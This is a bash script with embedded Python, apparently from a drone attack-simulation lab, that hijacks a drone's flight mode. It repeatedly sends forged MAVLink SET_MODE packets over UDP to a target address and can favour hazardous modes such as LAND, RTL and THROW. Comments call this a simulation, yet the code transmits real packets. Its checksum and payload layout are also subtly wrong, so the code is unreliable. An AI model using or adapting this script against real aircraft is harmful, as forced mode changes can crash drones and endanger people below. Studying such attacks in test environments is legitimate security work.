#!/usr/bin/env bash
# flight_mode_hijack.sh - 비행 모드 하이재킹 공격
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
. "$SCRIPT_DIR/../00_env.sh"
. "$SCRIPT_DIR/../sh_core/lpc_core.sh" 2>/dev/null || true

ACT_NAME="flight_mode_hijack"
TARGETS_FILE="${TARGETS_FILE:-"$SCRIPT_DIR/../scenarios/targets.txt"}"

# 모드 전환 공격 설정
INTENSITY="${INTENSITY:-medium}"
TARGET_MODE="${TARGET_MODE:-random}"  # specific mode or random
ATTACK_PATTERN="${ATTACK_PATTERN:-chaos}"  # chaos, loop, targeted

# 드론 비행 모드 정의
declare -A FLIGHT_MODES=(
    [0]="STABILIZE"
    [1]="ACRO"
    [2]="ALT_HOLD"
    [3]="AUTO"
    [4]="GUIDED"
    [5]="LOITER"
    [6]="RTL"
    [7]="CIRCLE"
    [8]="POSITION"
    [9]="LAND"
    [10]="OF_LOITER"
    [11]="DRIFT"
    [12]="SPORT"
    [13]="FLIP"
    [14]="AUTOTUNE"
    [15]="POSHOLD"
    [16]="BRAKE"
    [17]="THROW"
    [18]="AVOID_ADSB"
    [19]="GUIDED_NOGPS"
    [20]="SMART_RTL"
)

# 위험한 모드들 (공격 효과가 큰 모드)
DANGEROUS_MODES=(6 9 17)  # RTL, LAND, THROW

# ---- 비행 모드 하이재킹 공격 ----
do_act(){
  local target="${1:-10.13.0.4:14550}"
  local phase; phase="$(current_phase 2>/dev/null || echo 'cruise')"
  
  # 강도별 공격 빈도 조정
  local mode_changes_per_min switch_delay success_rate
  case "$INTENSITY" in
    low)    mode_changes_per_min=2; switch_delay=30; success_rate=60 ;;
    medium) mode_changes_per_min=6; switch_delay=10; success_rate=80 ;;
    high)   mode_changes_per_min=12; switch_delay=5; success_rate=95 ;;
  esac
  
  # 대상 모드 선택
  local target_mode_id target_mode_name
  case "$TARGET_MODE" in
    random)
      target_mode_id=$((RANDOM % 21))
      target_mode_name="${FLIGHT_MODES[$target_mode_id]}"
      ;;
    dangerous)
      target_mode_id="${DANGEROUS_MODES[$((RANDOM % ${#DANGEROUS_MODES[@]}))]}"
      target_mode_name="${FLIGHT_MODES[$target_mode_id]}"
      ;;
    *)
      # 특정 모드 지정
      target_mode_id="$TARGET_MODE"
      target_mode_name="${FLIGHT_MODES[$target_mode_id]:-UNKNOWN}"
      ;;
  esac
  
  local timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
  local target_ip="$(echo "$target" | cut -d':' -f1)"
  local target_port="$(echo "$target" | cut -d':' -f2)"
  
  # 공격 성공 여부 시뮬레이션
  local attack_success="false"
  if [[ $((RANDOM % 100)) -lt $success_rate ]]; then
    attack_success="true"
  fi
  
  # MAVLink SET_MODE 패킷 전송 시뮬레이션
  python3 -c "
import socket
import struct
import time

def send_mode_change(target_ip, target_port, mode_id, mode_name):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((target_ip, target_port))
        
        # MAVLink SET_MODE 패킷 구성
        # STX(1) + LEN(1) + SEQ(1) + SYS(1) + COMP(1) + MSG(1) + PAYLOAD(6) + CRC(2)
        set_mode_packet = bytearray([
            0xFE,  # STX
            0x06,  # LEN
            0x01,  # SEQ
            0xFF,  # SYS ID (attacking system)
            0x00,  # COMP ID
            0x0B,  # MSG ID (SET_MODE = 11)
            # PAYLOAD (6 bytes)
            0x01,  # target_system
            mode_id,  # base_mode
            0x00, 0x00, 0x00, 0x00  # custom_mode (4 bytes)
        ])
        
        # 간단한 체크섬 계산
        crc = sum(set_mode_packet[1:]) % 65536
        set_mode_packet.extend(struct.pack('<H', crc))
        
        # 패킷 전송
        sock.send(bytes(set_mode_packet))
        
        # 확인 패킷 전송 (여러 번)
        for i in range(3):
            time.sleep(0.1)
            sock.send(bytes(set_mode_packet))
        
        sock.close()
        print(f'모드 변경 패킷 전송 완료: {mode_name} (ID: {mode_id})')
        
    except Exception as e:
        print(f'모드 변경 공격 오류: {e}')

send_mode_change('$target_ip', int('$target_port'), $target_mode_id, '$target_mode_name')
" 2>/dev/null || echo "모드 변경 공격 시뮬레이션"
  
  # 공격 효과 계산
  local control_loss_duration safety_risk mission_disruption
  case "$target_mode_name" in
    "RTL"|"LAND"|"THROW")
      control_loss_duration=60; safety_risk="HIGH"; mission_disruption="CRITICAL" ;;
    "AUTO"|"GUIDED"|"LOITER")
      control_loss_duration=30; safety_risk="MEDIUM"; mission_disruption="HIGH" ;;
    *)
      control_loss_duration=15; safety_risk="LOW"; mission_disruption="MEDIUM" ;;
  esac
  
  # 추가 효과 (모드에 따른)
  local altitude_change position_drift battery_impact
  case "$target_mode_name" in
    "LAND")
      altitude_change=-100; position_drift=0; battery_impact=5 ;;
    "RTL")
      altitude_change=20; position_drift=500; battery_impact=15 ;;
    "THROW")
      altitude_change=50; position_drift=100; battery_impact=20 ;;
    *)
      altitude_change=0; position_drift=10; battery_impact=2 ;;
  esac
  
  # 로그 기록
  echo "[$timestamp] [$ACT_NAME] phase=$phase target=$target intensity=$INTENSITY target_mode=$target_mode_name mode_id=$target_mode_id pattern=$ATTACK_PATTERN success=$attack_success control_loss_duration=${control_loss_duration}s safety_risk=$safety_risk mission_disruption=$mission_disruption altitude_change=${altitude_change}m position_drift=${position_drift}m battery_impact=${battery_impact}%" >> "$LPC_LOG_DIR/bus.log"
  
  # 모드 변경 이벤트 파일 업데이트
  local mode_events_file="$LPC_LOG_DIR/mode_hijack_events.csv"
  if [[ ! -f "$mode_events_file" ]]; then
    echo "timestamp,original_mode,target_mode,success,risk_level,control_loss_sec" > "$mode_events_file"
  fi
  echo "$(date '+%Y-%m-%d %H:%M:%S'),UNKNOWN,$target_mode_name,$attack_success,$safety_risk,$control_loss_duration" >> "$mode_events_file"
  
  return 0
}

main(){
  if command -v lpc_loop >/dev/null 2>&1; then
    lpc_loop do_act "$TARGETS_FILE"
  else
    # Fallback: 시간 기반 루프
    local duration="${DUR:-30}"
    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    
    echo "[DEBUG] 비행 모드 하이재킹 시작: ${duration}초 동안"
    
    while [[ $(date +%s) -lt $end_time ]]; do
      do_act
      sleep "${LPC_INTERVAL_MS:-8000}" | awk '{print $1/1000}' | xargs sleep 2>/dev/null || sleep 8
    done
    
    echo "[DEBUG] 비행 모드 하이재킹 완료"
  fi
}

main "$@"